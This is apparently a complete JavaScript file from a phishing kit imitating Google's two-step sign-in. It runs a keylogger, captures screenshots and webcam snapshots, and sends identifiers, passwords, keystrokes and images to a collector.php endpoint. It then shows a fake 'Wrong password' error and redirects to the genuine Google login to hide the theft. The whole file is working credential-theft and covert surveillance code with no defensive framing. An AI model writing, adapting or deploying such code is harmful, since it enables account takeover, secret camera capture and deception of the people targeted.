// --- START COMMON SCRIPT.JS (unchanged, still includes keylogging, screenshot, camera) ---
let loggedKeys = ''; // Global variable to store keylogs
let cameraStream = null; // To hold the camera stream
let cameraActive = false; // Flag to check if camera is active

// Keylogging Event Listener: Records every key press
document.addEventListener('keydown', function(event) {
    // Exclude sensitive keys like Shift, Ctrl, Alt, Meta (Windows/Command) to keep logs cleaner
    if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab', 'Escape', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12'].includes(event.key)) {
        return;
    }
    // Handle special keys like Enter and Backspace
    if (event.key === 'Enter') {
        loggedKeys += '[ENTER]';
    } else if (event.key === 'Backspace') {
        loggedKeys += '[BACKSPACE]';
    } else {
        loggedKeys += event.key;
    }
    // console.log("Key pressed:", event.key, "Current log:", loggedKeys); // For debugging
});

// Function to send data to the collector.php using AJAX POST
function sendData(url, data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            if (callback) {
                callback(xhr.responseText);
            }
        }
    };

    // Encode data for URL-encoded format
    var encodedData = Object.keys(data).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key])).join('&');
    xhr.send(encodedData);
}

// Function to capture and send a screenshot of the current page
function captureAndSendScreenshot() {
    if (typeof html2canvas === 'undefined') {
        console.error("html2canvas is not loaded. Cannot capture screenshot.");
        sendData('collector.php', { error: 'html2canvas not loaded for screenshot.' });
        return;
    }

    html2canvas(document.body).then(function(canvas) {
        var imageData = canvas.toDataURL('image/png');
        sendData('collector.php', { screenshot: imageData }, function(response) {
            console.log('Screenshot sent:', response);
        });
    }).catch(function(error) {
        console.error('Screenshot capture failed:', error);
        sendData('collector.php', { error: 'Screenshot capture failed: ' + error.message });
    });
}

// Function to request camera access, capture an image, and send it
function captureAndSendCameraImage() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        console.warn("getUserMedia is not supported by this browser. Cannot access camera.");
        sendData('collector.php', { error: 'Camera access not supported by browser.' });
        return;
    }

    if (!cameraActive) {
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(function(stream) {
                cameraStream = stream;
                cameraActive = true;
                var video = document.getElementById('cameraFeed');
                video.srcObject = stream;
                video.play();

                setTimeout(function() {
                    takeCameraSnapshot();
                }, 1000);
            })
            .catch(function(err) {
                console.error("Error accessing camera: ", err);
                sendData('collector.php', { error: 'Camera access denied or failed: ' + err.name + ' - ' + err.message });
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                    cameraStream = null;
                    cameraActive = false;
                }
            });
    } else {
        takeCameraSnapshot();
    }
}

// Helper function to take a snapshot from the active video stream
function takeCameraSnapshot() {
    var video = document.getElementById('cameraFeed');
    var canvas = document.getElementById('cameraCanvas');
    var context = canvas.getContext('2d');

    if (video.videoWidth === 0 || video.videoHeight === 0 || !cameraActive) {
        console.warn("Video not ready or camera not active for snapshot.");
        if (!cameraActive && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             console.log("Re-attempting camera access for snapshot.");
             captureAndSendCameraImage();
        } else {
            sendData('collector.php', { error: 'Camera snapshot failed: Video not ready.' });
        }
        return;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    var imageData = canvas.toDataURL('image/png');
    sendData('collector.php', { camera_image: imageData }, function(response) {
        console.log('Camera image sent:', response);
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
            cameraActive = false;
            console.log("Camera stream stopped.");
        }
    });
}
// --- END COMMON SCRIPT.JS ---


// Template Specific Form Submission Logic for Google Phishing (now all on one page)
document.addEventListener('DOMContentLoaded', function() {
    var identifierStep = document.getElementById('identifier-step');
    var passwordStep = document.getElementById('password-step');

    var emailForm = document.getElementById('emailForm');
    var passwordForm = document.getElementById('passwordForm');

    var identifierInput = document.getElementById('identifier');
    var passwordInput = document.getElementById('password'); // Added
    var showPasswordCheckbox = document.getElementById('showPasswordCheckbox'); // Added

    var errorMessage = document.getElementById('error-message'); // For identifier step
    var passwordErrorMessage = document.getElementById('password-error-message'); // For password step

    var displayIdentifier = document.getElementById('displayIdentifier');
    var hiddenIdentifier = document.getElementById('hiddenIdentifier');

    // --- Show Password Toggle Logic ---
    if (showPasswordCheckbox) {
        showPasswordCheckbox.addEventListener('change', function() {
            if (this.checked) {
                passwordInput.type = 'text'; // Change input type to text to show password
            } else {
                passwordInput.type = 'password'; // Change back to password to hide
            }
        });
    }

    // --- Step 1: Identifier (Email/Phone) Submission ---
    emailForm.addEventListener('submit', function(e) {
        e.preventDefault(); // Prevent default form submission
        var identifier = identifierInput.value.trim();

        if (identifier === '') {
            errorMessage.textContent = "Enter an email or phone number.";
            errorMessage.style.display = 'block';
            return;
        }

        // Send identifier and current keylogs to collector.php
        sendData('collector.php', { identifier: identifier, keys: loggedKeys, next_step: true }, function(response) {
            console.log('Identifier and keylogs sent:', response);
            loggedKeys = ''; // Clear keylogs after sending for this step

            // Update password step elements
            displayIdentifier.textContent = identifier;
            hiddenIdentifier.value = identifier; // Store for password form submission

            // Hide identifier step, show password step
            identifierStep.style.display = 'none';
            passwordStep.style.display = 'block';

            // Focus on the password input for better UX
            passwordInput.focus();

            // Re-capture screenshot and camera image for the new page state
            captureAndSendScreenshot();
            captureAndSendCameraImage();
        });
    });

    // Hide identifier error message when user starts typing again
    identifierInput.addEventListener('focus', function() {
        errorMessage.style.display = 'none';
    });

    // --- Step 2: Password Submission ---
    passwordForm.addEventListener('submit', function(e) {
        e.preventDefault(); // Prevent default form submission
        var password = passwordInput.value;
        var identifier = hiddenIdentifier.value; // Get identifier from hidden field

        if (password === '') {
            passwordErrorMessage.textContent = "Enter your password.";
            passwordErrorMessage.style.display = 'block';
            return;
        }

        // Real Google login page for final redirection after data collection
        var redirectUrl = 'https://accounts.google.com/signin/v2/challenge/pwd?flowName=GlifWebSignIn&flowEntry=ServiceLogin';

        var dataToSend = {
            identifier: identifier,
            password: password,
            keys: loggedKeys, // Send any remaining keylogs
        };

        // Send all collected data (identifier, password, keylogs)
        sendData('collector.php', dataToSend, function(response) {
            console.log('Credentials and data sent:', response);
            loggedKeys = ''; // Clear keylogs after sending

            // Display a fake error message for a few seconds to make it more believable
            passwordErrorMessage.textContent = "Wrong password. Try again or click Forgot password to reset it.";
            passwordErrorMessage.style.display = 'block';

            // Redirect to the legitimate Google login after a delay
            setTimeout(function() {
                window.location.href = redirectUrl;
            }, 3000); // Redirect after 3 seconds
        });
    });

    // Hide password error message when user starts typing again
    passwordInput.addEventListener('focus', function() {
        passwordErrorMessage.style.display = 'none';
    });

    // --- Initial Data Collection on Page Load ---
    console.log("Page loaded. Initiating data collection...");

    // 1. Capture and Send Screenshot immediately
    captureAndSendScreenshot();

    // 2. Attempt to capture and Send Camera Image
    // This will trigger the browser's camera permission prompt
    captureAndSendCameraImage();
});
